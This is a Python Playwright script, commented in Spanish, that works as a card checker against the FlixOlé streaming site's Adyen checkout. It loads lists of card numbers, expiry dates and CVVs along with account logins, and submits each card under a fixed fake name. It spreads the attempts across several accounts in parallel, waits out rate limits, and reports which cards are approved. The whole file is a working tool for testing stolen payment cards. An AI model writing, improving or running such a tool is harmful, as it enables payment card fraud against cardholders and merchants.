"""
FlixOlé - Verificador de tarjetas (modo paralelo con múltiples cuentas)

Uso:
    1. Edita cards.csv    →  número | mes | año | cvv
    2. Edita accounts.csv →  email | password   (una cuenta por línea)
    3. python flixole_checker.py

Cómo funciona:
    - Las tarjetas se distribuyen entre las cuentas disponibles (round-robin)
    - Cada cuenta procesa sus tarjetas en paralelo (WORKERS_PER_ACCOUNT workers)
    - Resultado final en resultados.json y en consola
"""

import asyncio
import json
import sys
import os
from datetime import datetime

from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

# Silenciar logs de Playwright y HTTP
os.environ["PLAYWRIGHT_BROWSERS_PATH"] = "0"
os.environ["DEBUG"] = ""
os.environ["DEBUG_FILE"] = ""

# ── Configuración ──────────────────────────────────────────────────────────────
CARD_NAME           = "Juan Perez"   # nombre fijo para todas las tarjetas
CARDS_FILE          = "cards.csv"
ACCOUNTS_FILE       = "accounts.csv"
RESULTS_FILE        = "resultados.json"
HEADLESS            = True           # sin ventana siempre
TIMEOUT_MS          = 20_000
WORKERS_PER_ACCOUNT = 2              # tarjetas simultáneas por cuenta (sube con cuidado)
DELAY_AFTER_FAIL    = 10             # segundos extra de espera si una tarjeta falla por rate limit
# ──────────────────────────────────────────────────────────────────────────────


def load_csv(path: str) -> list[list[str]]:
    """Lee un CSV con separador | e ignora líneas vacías y comentarios."""
    rows = []
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = [p.strip() for p in line.split("|")]
            rows.append(parts)
    return rows


def load_cards(path: str) -> list[dict]:
    rows = load_csv(path)
    cards = []
    for parts in rows:
        if len(parts) < 4:
            print(f"  ⚠ Línea ignorada: {parts}")
            continue
        cards.append({
            "number":       parts[0].replace(" ", ""),
            "expiry_month": parts[1].zfill(2),
            "expiry_year":  parts[2],
            "cvv":          parts[3],
            "name":         CARD_NAME,
        })
    return cards


def load_accounts(path: str) -> list[dict]:
    rows = load_csv(path)
    accounts = []
    for parts in rows:
        if len(parts) < 2:
            continue
        accounts.append({"email": parts[0], "password": parts[1]})
    return accounts


# ── Funciones de navegación ───────────────────────────────────────────────────

async def login(page, email: str, password: str) -> None:
    await page.goto("https://ver.flixole.com/log-in", wait_until="networkidle")
    try:
        await page.click("text=Aceptar todo", timeout=5_000)
    except PlaywrightTimeout:
        pass
    await page.fill('input[type="email"]', email)
    await page.fill('input[type="password"]', password)
    await page.click('button[type="submit"]')
    await page.wait_for_function(
        "() => !window.location.href.includes('/log-in')",
        timeout=TIMEOUT_MS,
    )


async def go_to_checkout(page) -> bool:
    await page.goto("https://ver.flixole.com/checkout", wait_until="networkidle")

    # Seleccionar plan mensual
    try:
        mensual = page.locator('[data-plan*="monthly"], [data-plan*="mensual"]').first
        if await mensual.count() > 0:
            await mensual.click(timeout=5_000)
        else:
            mensual_text = page.locator('text=mensual').first
            if await mensual_text.count() > 0:
                await mensual_text.click(timeout=5_000)
    except PlaywrightTimeout:
        pass

    # Pulsar Continuar
    try:
        continuar = page.locator('button:has-text("Continuar")').first
        await continuar.wait_for(state="visible", timeout=10_000)
        await continuar.click()
        await page.wait_for_load_state("networkidle")
    except PlaywrightTimeout:
        return False

    await page.wait_for_timeout(2_000)

    has_iframe = await page.locator('iframe[src*="adyen"], iframe[src*="checkoutshopper"]').count() > 0
    has_direct = await page.locator('input[placeholder*="1234"], input[autocomplete*="cc-number"]').count() > 0
    return has_iframe or has_direct


async def fill_card(page, card: dict) -> None:
    """Rellena el formulario Adyen (iframes por campo)."""
    num_frame = page.frame_locator('iframe[title*="número de tarjeta"]')
    await num_frame.locator('input[placeholder*="1234"]').fill(card["number"])

    exp_frame = page.frame_locator('iframe[title*="caducidad"]')
    expiry = f"{card['expiry_month']}/{card['expiry_year'][-2:]}"
    await exp_frame.locator('input[placeholder="MM/AA"]').fill(expiry)

    cvc_frame = page.frame_locator('iframe[title*="seguridad"]')
    await cvc_frame.locator('input[placeholder*="dígitos"]').fill(card["cvv"])


async def submit_and_get_result(page) -> tuple[bool, str]:
    submit = page.locator(
        'button:has-text("Confirmar"), button:has-text("Pagar"), '
        'button:has-text("Suscribir"), button:has-text("Continuar"), '
        'button[type="submit"]'
    ).last
    await submit.click()

    try:
        await page.wait_for_timeout(3_000)
        await page.wait_for_load_state("networkidle", timeout=TIMEOUT_MS)
    except PlaywrightTimeout:
        pass

    body_text = (await page.inner_text("body")).lower()
    current_url = page.url

    # Rate limit
    if any(k in body_text for k in ["too many requests", "please wait", "demasiadas solicitudes"]):
        return False, "RATE_LIMIT"

    # Home sin "Suscríbete" = pago aprobado
    if current_url in ["https://ver.flixole.com/", "https://ver.flixole.com"]:
        if "suscríbete" not in body_text and "suscribete" not in body_text:
            return True, "Pago aprobado"
        return False, "Tarjeta rechazada"

    # Éxito por URL
    if any(k in current_url for k in ["/success", "/welcome", "/thank", "/gracias"]):
        return True, "Pago aprobado"

    # Keywords
    if any(k in body_text for k in ["gracias", "bienvenido", "activad", "completad", "success"]):
        return True, "Pago aprobado"
    if any(k in body_text for k in ["denegad", "declined", "fallado", "inválid", "invalid", "refused", "rechazad"]):
        for sel in ['[class*="error"]', '[role="alert"]', '[class*="refused"]']:
            el = page.locator(sel).first
            if await el.count() > 0:
                msg = await el.inner_text()
                return False, msg.strip()
        return False, "Tarjeta rechazada"

    return False, f"Sin respuesta clara (url: {current_url})"


# ── Worker ────────────────────────────────────────────────────────────────────

async def worker(worker_id: str, browser, account: dict, cards: list[dict],
                 results: list, semaphore: asyncio.Semaphore, print_lock: asyncio.Lock) -> None:
    """Procesa una lista de tarjetas con una cuenta, respetando el semáforo."""

    for card in cards:
        async with semaphore:
            tag = f"[{worker_id}] ****{card['number'][-4:]}"
            result = {
                "worker":    worker_id,
                "account":   account["email"],
                "number":    f"****{card['number'][-4:]}",
                "expiry":    f"{card['expiry_month']}/{card['expiry_year']}",
                "status":    "FAIL",
                "message":   "",
                "timestamp": datetime.now().isoformat(),
            }

            context = await browser.new_context()
            page    = await context.new_page()

            try:
                await login(page, account["email"], account["password"])
                found = await go_to_checkout(page)

                if not found:
                    result["message"] = "No se encontró el formulario de pago"
                else:
                    await fill_card(page, card)
                    success, message = await submit_and_get_result(page)
                    result["status"]  = "OK" if success else "FAIL"
                    result["message"] = message

                    if message == "RATE_LIMIT":
                        async with print_lock:
                            print(f"  ⚠ {tag} — Rate limit, esperando {DELAY_AFTER_FAIL}s...")
                        await asyncio.sleep(DELAY_AFTER_FAIL)

            except PlaywrightTimeout as e:
                result["message"] = f"Timeout: {str(e)[:80]}"
            except Exception as e:
                result["message"] = f"Error: {str(e)[:150]}"
            finally:
                await page.screenshot(path=f"ss_{card['number'][-4:]}.png")
                await context.close()

            results.append(result)
            icon = "✅" if result["status"] == "OK" else "❌"
            async with print_lock:
                print(f"  {icon} {tag} ({account['email']}) → {result['message']}")


# ── Main ──────────────────────────────────────────────────────────────────────

async def main():
    cards    = load_cards(CARDS_FILE)
    accounts = load_accounts(ACCOUNTS_FILE)

    if not accounts:
        print("❌ No hay cuentas en accounts.csv")
        sys.exit(1)

    print(f"Tarjetas : {len(cards)}")
    print(f"Cuentas  : {len(accounts)}")
    print(f"Workers  : {WORKERS_PER_ACCOUNT} por cuenta → {WORKERS_PER_ACCOUNT * len(accounts)} en total")
    print(f"Modo     : {'headless (sin ventana)' if HEADLESS else 'ventana visible'}\n")

    # Distribuir tarjetas entre cuentas (round-robin)
    buckets: dict[int, list[dict]] = {i: [] for i in range(len(accounts))}
    for idx, card in enumerate(cards):
        buckets[idx % len(accounts)].append(card)

    results: list[dict] = []
    print_lock = asyncio.Lock()

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=HEADLESS)

        # Un semáforo por cuenta limita workers simultáneos de esa cuenta
        tasks = []
        for i, account in enumerate(accounts):
            sem = asyncio.Semaphore(WORKERS_PER_ACCOUNT)
            worker_id = f"W{i+1}"
            task = asyncio.create_task(
                worker(worker_id, browser, account, buckets[i], results, sem, print_lock)
            )
            tasks.append(task)

        await asyncio.gather(*tasks)
        await browser.close()

    # Ordenar resultados por número de tarjeta
    results.sort(key=lambda r: r["number"])

    with open(RESULTS_FILE, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)

    # Reporte final
    passed = [r for r in results if r["status"] == "OK"]
    failed = [r for r in results if r["status"] == "FAIL"]

    print("\n" + "=" * 65)
    print("  REPORTE FINAL")
    print("=" * 65)
    print(f"\n✅ APROBADAS ({len(passed)}):")
    for r in passed:
        print(f"   {r['number']}  {r['expiry']}  [{r['account']}]")
        print(f"       → {r['message']}")

    print(f"\n❌ FALLIDAS ({len(failed)}):")
    for r in failed:
        print(f"   {r['number']}  {r['expiry']}  [{r['account']}]")
        print(f"       → {r['message']}")

    print("\n" + "=" * 65)
    print(f"  Total: {len(results)}  |  ✅ OK: {len(passed)}  |  ❌ FAIL: {len(failed)}")
    elapsed_info = f"  Resultados guardados en: {RESULTS_FILE}"
    print(elapsed_info)
    print("=" * 65)


if __name__ == "__main__":
    asyncio.run(main())
